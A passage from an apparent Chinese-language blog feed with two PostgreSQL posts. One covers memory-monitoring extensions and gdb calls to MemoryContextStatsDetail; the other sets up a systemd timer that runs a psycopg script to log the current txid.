postgres | -9125306597209436601 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">|     10 | postgres |  4513628886796981822 |               0 |                0 |                   0 |                   0 |</span><br><span class="line">+--------+----------+----------------------+-----------------+------------------+---------------------+---------------------+</span><br><span class="line">(15 rows)</span><br></pre></td></tr></table></figure></div>
<p>这里提示四个关键列值需要注意：</p>
<ul>
<li>shared_blks_hit 显示从缓存返回的共享内存块的总数</li>
<li>shared_blks_read 显示非缓存返回的共享块的总数</li>
<li>shared_blks_dirtied 显示被查询执行“脏”块的共享内存块的数量(例如，查询修改了一个块中的至少一个元组，并且该块必须写入驱动器)</li>
<li>shared_blks_written 显示在查询执行期间同时写入驱动器的共享内存块的数量</li>
</ul>
<p>其他信息可参考：<a class="link"   href="https://www.modb.pro/db/402059" >PostgreSQL 性能监控工具之 pg_stat_monitor 插件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="system-stats">system_stats</h2>
<p>system_stats 是一个 PostgreSQL 扩展插件， 由 EDB 公司开发维护，它提供了访问系统级统计信息的函数，可以用于监控。<br>
支持Linux、macOS和Windows操作系统。注意，并非所有值都与所有操作系统相关。在这种情况下，受影响的值将返回NULL。</p>
<p>该插件提供了两个函数可供观测内存。</p>
<p>示例如下，可与 free 对比查看。</p>
<ol>
<li>pg_sys_memory_info</li>
</ol>
<p>该接口允许用户获取内存使用信息。 所有的值都以字节为单位。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">22</span>:<span class="number">38</span>:<span class="number">01</span># <span class="keyword">select</span> pg_sys_memory_info();</span><br><span class="line"><span class="operator">+</span><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">-------+--------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> pg_sys_memory_info <span class="operator">|</span> (<span class="number">3953745920</span>,<span class="number">3791622144</span>,<span class="number">162123776</span>,<span class="number">2147479552</span>,<span class="number">532480</span>,<span class="number">2146947072</span>,<span class="number">2944073728</span>,,,,,) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+--------------------------------------------------------------------------------+</span></span><br><span class="line"></span><br><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">22</span>:<span class="number">37</span>:<span class="number">45</span># \<span class="operator">!</span> <span class="keyword">free</span> <span class="operator">-</span>kb</span><br><span class="line">              total        used        <span class="keyword">free</span>      shared  buff<span class="operator">/</span>cache   available</span><br><span class="line">Mem:     <span class="number">3953745920</span>   <span class="number">620945408</span>   <span class="number">161964032</span>   <span class="number">308969472</span>  <span class="number">3170836480</span>  <span class="number">2727837696</span></span><br><span class="line">Swap:    <span class="number">2147479552</span>      <span class="number">532480</span>  <span class="number">2146947072</span></span><br></pre></td></tr></table></figure></div>
<ol start="2">
<li>pg_sys_cpu_memory_by_process</li>
</ol>
<p>该接口允许用户获取每个进程 ID 的 CPU 和内存信息。</p>
<p>示例如下，该方法列举的进程过多，这里只截取了 postgres 进程信息。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">(postgres@[<span class="keyword">local</span>]) [postgres] <span class="number">22</span>:<span class="number">41</span>:<span class="number">54</span># <span class="keyword">select</span> pg_sys_cpu_memory_by_process();</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>           pg_sys_cpu_memory_by_process           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="number">1</span>,&quot;(systemd)&quot;,<span class="number">160219</span>,<span class="number">0</span>,<span class="number">0.12</span>,<span class="number">4579328</span>)            <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"><span class="operator">|</span> (<span class="number">120123</span>,&quot;(postgres)&quot;,<span class="number">1930</span>,<span class="number">0</span>,<span class="number">7.22</span>,<span class="number">285437952</span>)      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> (<span class="number">120124</span>,&quot;(postgres)&quot;,<span class="number">1930</span>,<span class="number">0</span>,<span class="number">0.09</span>,<span class="number">3727360</span>)        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> (<span class="number">120125</span>,&quot;(postgres)&quot;,<span class="number">1930</span>,<span class="number">0</span>,<span class="number">0.07</span>,<span class="number">2650112</span>)        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> (<span class="number">120127</span>,&quot;(postgres)&quot;,<span class="number">1930</span>,<span class="number">0</span>,<span class="number">0.14</span>,<span class="number">5365760</span>)        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> (<span class="number">120128</span>,&quot;(postgres)&quot;,<span class="number">1930</span>,<span class="number">0</span>,<span class="number">0.06</span>,<span class="number">2355200</span>)        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> (<span class="number">120129</span>,&quot;(postgres)&quot;,<span class="number">1930</span>,<span class="number">0</span>,<span class="number">0.05</span>,<span class="number">2101248</span>)        <span class="operator">|</span></span><br></pre></td></tr></table></figure></div>
<h2 id="pg-stat-kcache">pg_stat_kcache</h2>
<p>该插件是由 PoWA 团队开发的，主要编写语言为 C 语言。</p>
<p>PoWA 是一个开源项目，是一个PostgreSQL工作负载分析器，它收集性能统计数据，并提供实时图表和图形来帮助监视和优化PostgreSQL服务器。</p>
<p>该插件可用于收集文件系统层实际读写的统计信息，依赖，并需要先安装 pg_stat_statements 扩展。<br>
该模块需要一些共享内存来保存它的计数器，这个模块必须在PostgreSQL启动时加载。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">shared_preload_libraries = &#x27;pg_stat_statements,pg_stat_kcache&#x27;</span><br></pre></td></tr></table></figure></div>
<p>可通过下面方法调用该函数：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> pg_stat_kcache(); </span><br></pre></td></tr></table></figure></div>
<h2 id="Debug-Info">Debug Info</h2>
<p>编译 PostgreSQL 源码时，可以加入两个 debug 参数，<code>--enable-debug --enable-dtrace</code>，以开启部分 debug 信息。</p>
<p>psql 进入到服务器后，可以看到有如下几个 debug 参数，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">(postgres@[local]) [postgres] 19:12:30# \dconfig+ *debug*</span><br><span class="line">                         List of configuration parameters</span><br><span class="line">+-----------------------+-------+---------+-------------------+-------------------+</span><br><span class="line">|       Parameter       | Value |  Type   |      Context      | Access privileges | mark by Yan.</span><br><span class="line">+-----------------------+-------+---------+-------------------+-------------------+</span><br><span class="line">| debug_assertions      | off   | bool    | internal          |                   | --enable-cassert</span><br><span class="line">| debug_discard_caches  | 0     | integer | superuser         |                   | +V14, prod: 0</span><br><span class="line">| debug_pretty_print    | on    | bool    | user              |                   |</span><br><span class="line">| debug_print_parse     | off   | bool    | user              |                   |</span><br><span class="line">| debug_print_plan      | off   | bool    | user              |                   |</span><br><span class="line">| debug_print_rewritten | off   | bool    | user              |                   |</span><br><span class="line">| jit_debugging_support | off   | bool    | superuser-backend |                   | +V11, LLVM</span><br><span class="line">+-----------------------+-------+---------+-------------------+-------------------+</span><br><span class="line">(7 rows)</span><br></pre></td></tr></table></figure></div>
<p>PG v14 引入了新参数 <code>debug_discard_caches</code>, PG v15 没有变化。</p>
<h3 id="MemoryContextStats">MemoryContextStats</h3>
<p>下面说说 gdb 调试，</p>
<p>在之前版本的文档中，可以看到如下两个命令，来打印内存上下文情况。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb --batch-silent -ex &#x27;call MemoryContextStats(TopMemoryContext,100)&#x27; -p 107398</span><br><span class="line">gdb --batch-silent -ex &#x27;call MemoryContextStatsDetail(TopMemoryContext,100)&#x27; -p 105941</span><br></pre></td></tr></table></figure></div>
<p>但从 PostgreSQL v14 开始，<code>MemoryContextStatsDetail</code> 增加了第三个参数，是否打印到 stderr。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * You should not do memory allocations within a critical section, because</span></span><br><span class="line"><span class="comment">@@ -499,28 +505,52 @@ void</span></span><br><span class="line"><span class="comment">MemoryContextStats(MemoryContext context)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">	/* A hard-wired limit on the number of children is usually good enough */</span></span><br><span class="line">	MemoryContextStatsDetail(context, <span class="number">100</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MemoryContextStatsDetail</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Entry point for use if you want to vary the number of child contexts shown.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * If print_to_stderr is true, print statistics about the memory contexts</span></span><br><span class="line"><span class="comment"> * with fprintf(stderr), otherwise use ereport().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">MemoryContextStatsDetail</span><span class="params">(MemoryContext context, <span class="type">int</span> max_children,</span></span><br><span class="line"><span class="params">						 <span class="type">bool</span> print_to_stderr)</span></span><br></pre></td></tr></table></figure></div>
<p>所以，如果继续用上面的命令，就会遇到如下报错。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# gdb --batch-silent -ex &#x27;call MemoryContextStatsDetail(TopMemoryContext, 100)&#x27; -p 118791</span><br><span class="line">Too few arguments in function call.</span><br></pre></td></tr></table></figure></div>
<p>来看下 print_to_stderr 两个值的差别：</p>
<ul>
<li>true</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# gdb --batch-silent -ex &#x27;call MemoryContextStatsDetail(TopMemoryContext, 100, 1)&#x27; -p 118791</span><br><span class="line"></span><br><span class="line">[postgres@centos7 log]$ TopMemoryContext: 8192 total in 1 blocks; 6920 free (0 chunks); 1272 used</span><br><span class="line">  LOCALLOCK hash: 8192 total in 1 blocks; 552 free (0 chunks); 7640 used</span><br><span class="line">  Timezones: 104120 total in 2 blocks; 2616 free (0 chunks); 101504 used</span><br><span class="line">  Postmaster: 8192 total in 1 blocks; 7368 free (7 chunks); 824 used</span><br><span class="line">    ident parser context: 1024 total in 1 blocks; 760 free (0 chunks); 264 used</span><br><span class="line">    hba parser context: 17408 total in 5 blocks; 8120 free (6 chunks); 9288 used</span><br><span class="line">  ErrorContext: 8192 total in 1 blocks; 7928 free (5 chunks); 264 used</span><br><span class="line">Grand total: 155320 bytes in 12 blocks; 34264 free (18 chunks); 121056 used</span><br></pre></td></tr></table></figure></div>
<ul>
<li>false</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# gdb --batch-silent -ex &#x27;call MemoryContextStatsDetail(TopMemoryContext, 100, 0)&#x27; -p 118791</span><br><span class="line"></span><br><span class="line">[postgres@centos7 log]$ 2023-03-05 21:23:46.362 CST [118791] LOG:  level: 0; TopMemoryContext: 8192 total in 1 blocks; 6920 free (0 chunks); 1272 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  level: 1; LOCALLOCK hash: 8192 total in 1 blocks; 552 free (0 chunks); 7640 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  level: 1; Timezones: 104120 total in 2 blocks; 2616 free (0 chunks); 101504 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  level: 1; Postmaster: 8192 total in 1 blocks; 7368 free (7 chunks); 824 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  level: 2; ident parser context: 1024 total in 1 blocks; 760 free (0 chunks); 264 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  level: 2; hba parser context: 17408 total in 5 blocks; 8120 free (6 chunks); 9288 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  level: 1; ErrorContext: 8192 total in 1 blocks; 7928 free (5 chunks); 264 used</span><br><span class="line">2023-03-05 21:23:46.362 CST [118791] LOG:  Grand total: 155320 bytes in 12 blocks; 34264 free (18 chunks); 121056 used</span><br><span class="line"></span><br><span class="line">[postgres@centos7 log]$ </span><br></pre></td></tr></table></figure></div>
<p>需要补充道，PostgreSQL 14 还增加了方法：<code>pg_log_backend_memory_contexts()</code>，来指示服务器用指定的 PID 记录后台的内存上下文。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pg_log_backend_memory_contexts(<span class="number">2294080</span>);</span><br></pre></td></tr></table></figure></div>
<h2 id="End">End</h2>
<p>PostgreSQL 作为学院派数据库的典型代表，其功能特性还是值得深挖研究的，追根溯源，很多国产数据库里都有 PostgreSQL 的影子，学好 PostgreSQL 也为“换梯子”到国产数据库做了技术积累与铺垫。<br>
PostgreSQL 的扩展模块开放了一个很规范的接口模型，可以便利的使用其他厂商开源的插件，也为开发者自定义开发插件提供了便利。<br>
作为查看内存信息的入门篇，本文只是从三个角度记录了大概模样，具体技术细节还有待进一步深挖研习。</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/617259" >https://www.modb.pro/db/617259 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>
<a class="link"   href="https://pgfans.cn/a/2254" >https://pgfans.cn/a/2254 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>PostgreSQL</category>
        <category>PostgreSQL 15</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>postgresql 15</tag>
        <tag>extension</tag>
        <tag>smem</tag>
        <tag>memory</tag>
      </tags>
  </entry>
  <entry>
    <title>【PG15】Python 脚本定时查询当前 txid</title>
    <url>/2023/postgresql/pg-15-check-txid-with-python/</url>
    <content><![CDATA[<h2 id="BG">BG</h2>
<p>前几日，群友在讨论 DBA 学习那种编程语言较好，当时老师解惑道：</p>
<blockquote>
<p>这个视实际情况而定，<br>
go, python, java, c(c++), js(nodejs), RUST, 最好能熟练使用其中的一到两种，然后其它的能看懂逻辑。</p>
</blockquote>
<p>一时起兴翻了翻最新的开发语言排行榜，Go目前排在11位，Python依旧稳居第一。</p>
<img  alt="p1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230303-abfb9967-7191-4a42-9371-5430bb17b1d4.png"
                      referrerpolicy="no-referrer"
                >
<p>对于 DBA 来说，语言也是工具，来实现一些日常所需的功能，或者测试一些没接触过的特性，再或者实现一些好玩的事情。</p>
<p>本文的核心是 <strong>“用python写了一个小脚本，定时执行某个job， 要求你定义一个服务文件”。</strong></p>
<h2 id="PG-15-源码编译，如何用-systemd-管理-postgresql-服务">PG 15 源码编译，如何用 systemd 管理 postgresql 服务</h2>
<blockquote>
<p>本文以 CentOS 7 + PostgreSQL 15 为例</p>
</blockquote>
<p>在生产环境，一般都会用 systemd 来管理服务，而非直接使用 pg_ctl 来进行数据库启停操作。<br>
源码编译时，需要传递参数 <code>--with-systemd</code> 源码会对此进行一些优化处理，比如服务启动超时时间。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">./configure --prefix=/opt/pgsql-152 --with-extra-version=&quot;-Yan&quot; --with-systemd</span><br></pre></td></tr></table></figure></div>
<p>但使用此参数需要先安装依赖 <code>systemd-devel</code>，否则会报错：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">configure: error: header file &lt;systemd/sd-daemon.h&gt; is required for systemd support</span><br></pre></td></tr></table></figure></div>
<p>具体编译过程快进。。。 》》》。。。</p>
<p>经过漫长的等待，可以看到编译后的源码已经安装到路径 <code>/opt/pgsql-152</code> 下。</p>
<p>初始化之后，我们可以安装 service 文件，如将准备好的 <code>postgresql-15.service</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>file (systemd)</span></figcaption><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=PostgreSQL 15 database server</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=notify</span><br><span class="line">User=postgres</span><br><span class="line">ExecStart=/usr/pgsql-15/bin/postmaster -D /data/pgdata-152/data</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=mixed</span><br><span class="line">KillSignal=SIGINT</span><br><span class="line">TimeoutSec=0</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>
<p>放到路径 <code>/etc/systemd/system/postgresql-15.service</code> 下，然后启动它。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 pgsql-15]$ systemctl status postgresql-15</span><br><span class="line">● postgresql-15.service - PostgreSQL 15 database server</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/postgresql-15.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">[postgres@centos7 pgsql-15]$ sudo systemctl start postgresql-15</span><br><span class="line">[postgres@centos7 pgsql-15]$ systemctl status postgresql-15</span><br><span class="line">● postgresql-15.service - PostgreSQL 15 database server</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/postgresql-15.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Fri 2023-03-03 22:45:22 CST; 2s ago</span><br><span class="line"> Main PID: 78550 (postmaster)</span><br><span class="line">    Tasks: 6</span><br><span class="line">   CGroup: /system.slice/postgresql-15.service</span><br><span class="line">           ├─78550 /usr/pgsql-15/bin/postmaster -D /data/pgdata-152/data</span><br><span class="line">           ├─78553 postgres: checkpointer </span><br><span class="line">           ├─78554 postgres: background writer </span><br><span class="line">           ├─78556 postgres: walwriter </span><br><span class="line">           ├─78557 postgres: autovacuum launcher </span><br><span class="line">           └─78558 postgres: logical replication launcher </span><br><span class="line">[postgres@centos7 pgsql-15]$ </span><br><span class="line">[postgres@centos7 pgsql-15]$ psql</span><br><span class="line"></span><br><span class="line">Welcome to PostgreSQL !</span><br><span class="line">Your PostgreSQL connection id is 78575</span><br><span class="line">Server version:15.2</span><br><span class="line">---------------</span><br><span class="line">Border style is 2.</span><br><span class="line">Timing is on.</span><br><span class="line">Null display is &quot;[null]&quot;.</span><br><span class="line">psql (15.2-Yan)</span><br><span class="line">Type &quot;help&quot; for help.</span><br><span class="line"></span><br><span class="line">(postgres@[local]) [postgres] 22:46:21# \l</span><br><span class="line">                                                  List of databases</span><br><span class="line">+-----------+----------+----------+-------------+-------------+------------+-----------------+-----------------------+</span><br><span class="line">|   Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   |</span><br><span class="line">+-----------+----------+----------+-------------+-------------+------------+-----------------+-----------------------+</span><br><span class="line">| postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            |                       |</span><br><span class="line">| template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +|</span><br><span class="line">|           |          |          |             |             |            |                 | postgres=CTc/postgres |</span><br><span class="line">| template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +|</span><br><span class="line">|           |          |          |             |             |            |                 | postgres=CTc/postgres |</span><br><span class="line">+-----------+----------+----------+-------------+-------------+------------+-----------------+-----------------------+</span><br><span class="line">(3 rows)</span><br></pre></td></tr></table></figure></div>
<h2 id="使用-Python-连接-PostgreSQL，并查看当前-txid">使用 Python 连接 PostgreSQL，并查看当前 txid</h2>
<p>这里使用 <strong>psycopg</strong> 连接 PostgreSQL 数据库，</p>
<p>Psycopg 是用 Python 实现的最常用、最可靠、功能最丰富的 PostgreSQL适配器。<br>
Psycopg 需要 Python 版本 3.7 到 3.11。支持 PostgreSQL 10 到 15。操作系统支持 Linux, macOS, Windows。</p>
<img  alt="p2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230303-03818a03-7543-477b-bcc8-31eb73aeae64.png"
                      referrerpolicy="no-referrer"
                >
<h3 id="适配-PostgreSQL-15">适配 PostgreSQL 15</h3>
<p>从 psycopg 的 Release Notes <sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> 可以看到，是从 3.1.4 这个版本开始适配 PostgreSQL 15</p>
<p>不过，本文只是最基础的使用场景，所以之前的版本也是可以用的，如我本地版本就是 psycopg (3.0.18)</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@centos7 ~]# pip3 list --format=columns</span><br><span class="line">Package             Version</span><br><span class="line">------------------- -------</span><br><span class="line">backports.zoneinfo  0.2.1  </span><br><span class="line">importlib-resources 5.4.0  </span><br><span class="line">pip                 9.0.3  </span><br><span class="line">psycopg             3.0.18 </span><br><span class="line">setuptools          39.2.0 </span><br><span class="line">typing-extensions   4.1.1  </span><br><span class="line">zipp                3.6.0  </span><br><span class="line">[root@centos7 ~]# </span><br></pre></td></tr></table></figure></div>
<h3 id="Demo">Demo</h3>
<p>基础用法很简单，安装好 Psycopg 后，配置连接信息，然后就可以写 SQL 进行数据交互了。<br>
比如，连接到本地 PostgreSQL，端口为 5555，dbname 为 mydb，就可以这样写配置信息：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Connect to an existing database</span></span><br><span class="line"><span class="keyword">with</span> psycopg.connect(<span class="string">&quot;dbname=mydb user=postgres port=5555&quot;</span>) <span class="keyword">as</span> conn:</span><br></pre></td></tr></table></figure></div>
<p>接下来就很简单了，实现题目要求，查看当前时间和 txid，并输出到 <code>/tmp/pg_txid.log</code>。</p>
<p>txid 是 PostgreSQL 的常规知识，用 SQL 语句查询即可。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> now(), txid_current();</span><br></pre></td></tr></table></figure></div>
<p>实际演示效果如下，</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 ~]$ python3 demo.py </span><br><span class="line">[postgres@centos7 ~]$ cat /tmp/pg_txid.log </span><br><span class="line">2023-03-03 23:03:06,736</span><br><span class="line">[postgres@centos7 ~]$ python3 demo.py </span><br><span class="line">[postgres@centos7 ~]$ cat /tmp/pg_txid.log </span><br><span class="line">2023-03-03 23:03:06,736</span><br><span class="line">2023-03-03 23:04:19,737</span><br><span class="line">[postgres@centos7 ~]$ python3 demo.py </span><br><span class="line">[postgres@centos7 ~]$ cat /tmp/pg_txid.log </span><br><span class="line">2023-03-03 23:03:06,736</span><br><span class="line">2023-03-03 23:04:19,737</span><br><span class="line">2023-03-03 23:04:23,738</span><br><span class="line">[postgres@centos7 ~]$ </span><br></pre></td></tr></table></figure></div>
<h2 id="systemd-定时功能，定时调用-py-文件">systemd 定时功能，定时调用 py 文件</h2>
<p>systemd 有定时功能，但很少用，大多数情况仍然习惯使用 crontab 进行定时任务管理。</p>
<p>可以通过命令 <code>systemctl list-timers</code> 查看当前系统有哪些定时命令。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 ~]$ systemctl list-timers </span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES</span><br><span class="line">Sat 2023-03-04 00:00:00 CST  52min left Fri 2023-03-03 18:14:13 CST  4h 53min ago unbound-anchor.timer         unbound-an</span><br><span class="line">Sat 2023-03-04 19:35:51 CST  20h left   Fri 2023-03-03 19:33:06 CST  3h 34min ago systemd-tmpfiles-clean.timer systemd-tm</span><br><span class="line"></span><br><span class="line">2 timers listed.</span><br><span class="line">Pass --all to see loaded but inactive timers, too.</span><br><span class="line">[postgres@centos7 ~]$ </span><br><span class="line">[postgres@centos7 ~]$ systemctl list-timers --all</span><br><span class="line">NEXT                         LEFT       LAST                         PASSED       UNIT                         ACTIVATES</span><br><span class="line">Sat 2023-03-04 00:00:00 CST  52min left Fri 2023-03-03 18:14:13 CST  4h 53min ago unbound-anchor.timer         unbound-an</span><br><span class="line">Sat 2023-03-04 19:35:51 CST  20h left   Fri 2023-03-03 19:33:06 CST  3h 34min ago systemd-tmpfiles-clean.timer systemd-tm</span><br><span class="line">n/a                          n/a        n/a                          n/a          systemd-readahead-done.timer systemd-re</span><br><span class="line"></span><br><span class="line">3 timers listed.</span><br><span class="line">[postgres@centos7 ~]$ </span><br></pre></td></tr></table></figure></div>
<p>关于 timer 的更多信息，可以直接查阅 man 文档。<br>
对于每个计时器文件，必须存在一个匹配的单元文件，描述当计时器失效时要激活的单元。<br>
缺省情况下，与定时器同名(后缀不同)的服务被激活。<br>
例如:定时器文件foo。定时器激活一个匹配的服务 foo.service。</p>
<p>任务继续，<strong>创建一个定时任务，每 5s 查询一次当前 txid。</strong></p>
<p>思路有了，服务文件需要稍加测试一下，便可以呈现出最终效果。</p>
<ul>
<li>服务文件</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>file (systemd)</span></figcaption><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Collect PG connections service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/python3 /home/postgres/demo.py</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>
<ul>
<li>定时器</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><figcaption><span>file (systemd)</span></figcaption><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Collect PG connections timer</span><br><span class="line"></span><br><span class="line">[Timer]</span><br><span class="line">Unit=pgcol.service</span><br><span class="line">OnCalendar=*-*-* *:*:00/5</span><br><span class="line">Persistent=true</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=timers.target</span><br></pre></td></tr></table></figure></div>
<ul>
<li>安装并启用定时器</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 ~]$ sudo vi /etc/systemd/system/pgcol.service</span><br><span class="line">[postgres@centos7 ~]$ systemctl daemon-reload</span><br><span class="line">==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===</span><br><span class="line">Authentication is required to reload the systemd state.</span><br><span class="line">Authenticating as: shawnyan</span><br><span class="line">Password: </span><br><span class="line">==== AUTHENTICATION COMPLETE ===</span><br><span class="line">[postgres@centos7 ~]$ systemctl status pgcol.service</span><br><span class="line">● pgcol.service - Collect PG connections service</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/pgcol.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">[postgres@centos7 ~]$ sudo vi /etc/systemd/system/pgcol.timer</span><br><span class="line">[postgres@centos7 ~]$ sudo systemctl enable --now pgcol.timer</span><br><span class="line">[postgres@centos7 ~]$ systemctl status pgcol.timer</span><br><span class="line">● pgcol.timer - Collect PG connections timer</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/pgcol.timer; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (waiting) since Fri 2023-03-03 23:21:49 CST; 9s ago</span><br><span class="line">[postgres@centos7 ~]$ </span><br></pre></td></tr></table></figure></div>
<ul>
<li>查看日志输出</li>
</ul>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[postgres@centos7 ~]$ tailf /tmp/pg_txid.log </span><br><span class="line">2023-03-03 23:46:46,765</span><br><span class="line">2023-03-03 23:47:46,766</span><br><span class="line">2023-03-03 23:48:46,767</span><br><span class="line">2023-03-03 23:49:46,768</span><br><span class="line">2023-03-03 23:50:01,769</span><br><span class="line">2023-03-03 23:50:46,770</span><br><span class="line">2023-03-03 23:51:46,771</span><br><span class="line">2023-03-03 23:52:46,772</span><br><span class="line">2023-03-03 23:53:01,773</span><br><span class="line">2023-03-03 23:53:46,775</span><br><span class="line">^C</span><br><span class="line">[postgres@centos7 ~]$ </span><br><span class="line">[postgres@centos7 ~]$ sudo journalctl -f </span><br><span class="line">-- Logs begin at Sun 2023-02-26 22:03:41 CST. --</span><br><span class="line">Mar 03 23:50:45 centos7.shawnyan.com systemd[1]: Started Collect PG connections service.</span><br><span class="line">Mar 03 23:51:45 centos7.shawnyan.com systemd[1]: Started Collect PG connections service.</span><br><span class="line">Mar 03 23:52:45 centos7.shawnyan.com systemd[1]: Started Collect PG connections service.</span><br><span class="line">Mar 03 23:53:01 centos7.shawnyan.com systemd[1]: Started Collect PG connections service.</span><br><span 